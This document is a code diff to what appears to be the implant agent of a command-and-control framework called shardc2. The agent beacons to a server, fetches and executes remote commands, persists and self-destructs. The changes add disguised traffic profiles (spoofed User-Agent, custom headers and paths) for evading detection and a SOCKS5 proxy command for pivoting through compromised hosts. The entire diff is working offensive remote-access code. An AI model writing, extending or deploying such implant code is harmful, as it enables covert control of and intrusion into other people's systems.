@@ -20,6 +20,7 @@ import (
 
 	"github.com/shardc2/shardc2/pkg/crypto"
 	"github.com/shardc2/shardc2/pkg/models"
+	"github.com/shardc2/shardc2/pkg/profiles"
 )
 
 const (
@@ -34,6 +35,7 @@ type Config struct {
 	Interval   time.Duration
 	Jitter     time.Duration
 	KillDate   time.Time
+	Profile    *profiles.Profile
 }
 
 type Agent struct {
@@ -42,6 +44,7 @@ type Agent struct {
 	sessionToken string
 	client       *http.Client
 	profile      *SystemProfile
+	proxySrv     *SOCKS5Server
 }
 
 type SystemProfile struct {
@@ -95,6 +98,9 @@ func New(cfg Config) *Agent {
 	}
 	if cfg.Jitter == 0 {
 		cfg.Jitter = 60 * time.Second
+	}
+	if cfg.Profile == nil {
+		cfg.Profile = profiles.Default()
 	}
 
 	return &Agent{config: cfg, client: client}
@@ -169,6 +175,12 @@ func (a *Agent) doEncryptedRequest(ctx context.Context, method, path string, jso
 		return nil, 0, err
 	}
 	req.Header.Set("Content-Type", contentType)
+	req.Header.Set("User-Agent", a.config.Profile.Agent.UserAgent)
+	for _, h := range a.config.Profile.Headers {
+		if h.Value != "dynamic" {
+			req.Header.Set(h.Name, h.Value)
+		}
+	}
 	if a.sessionToken != "" {
 		req.Header.Set("X-Session-Token", a.sessionToken)
 	}
@@ -216,7 +228,7 @@ func (a *Agent) Register(ctx context.Context) error {
 		reqBody = data
 	}
 
-	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/register", bytes.NewReader(reqBody))
+	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+a.config.Profile.AgentPath("register"), bytes.NewReader(reqBody))
 	if err != nil {
 		return err
 	}
@@ -255,7 +267,7 @@ func (a *Agent) Register(ctx context.Context) error {
 }
 
 func (a *Agent) Beacon(ctx context.Context) (*beaconResponse, error) {
-	respBody, status, err := a.doEncryptedRequest(ctx, "POST", "/api/v1/agent/beacon", nil)
+	respBody, status, err := a.doEncryptedRequest(ctx, "POST", a.config.Profile.AgentPath("beacon"), nil)
 	if err != nil {
 		return nil, fmt.Errorf("beacon failed: %w", err)
 	}
@@ -301,7 +313,7 @@ func (a *Agent) StartBeaconing(ctx context.Context) error {
 }
 
 func (a *Agent) refreshToken(ctx context.Context) {
-	respBody, status, err := a.doEncryptedRequest(ctx, "POST", "/api/v1/agent/refresh-token", nil)
+	respBody, status, err := a.doEncryptedRequest(ctx, "POST", a.config.Profile.AgentPath("refresh_token"), nil)
 	if err != nil || status != 200 {
 		return
 	}
@@ -321,7 +333,7 @@ func (a *Agent) selfDestruct() {
 }
 
 func (a *Agent) fetchAndExecuteCommands(ctx context.Context) {
-	respBody, _, err := a.doEncryptedRequest(ctx, "GET", "/api/v1/agent/commands", nil)
+	respBody, _, err := a.doEncryptedRequest(ctx, "GET", a.config.Profile.AgentPath("commands"), nil)
 	if err != nil {
 		log.Printf("[-] Failed to fetch commands: %v", err)
 		return
@@ -359,6 +371,8 @@ func (a *Agent) DispatchCommand(ctx context.Context, cmd serverCommand) (string,
 		return a.handleSleep(cmd.Payload)
 	case models.CmdTypePersist:
 		return a.handlePersist(cmd.Payload)
+	case models.CmdTypeProxy:
+		return a.HandleProxy(cmd.Payload)
 	case models.CmdTypeKill:
 		return "agent shutting down", nil
 	default:
@@ -479,7 +493,7 @@ func (a *Agent) reportResult(ctx context.Context, cmdID, output, status string) 
 		"output":     output,
 		"status":     status,
 	}
-	_, _, err := a.doEncryptedRequest(ctx, "POST", "/api/v1/agent/result", body)
+	_, _, err := a.doEncryptedRequest(ctx, "POST", a.config.Profile.AgentPath("result"), body)
 	if err != nil {
 		log.Printf("[-] Failed to report result for %s: %v", cmdID, err)
 	}
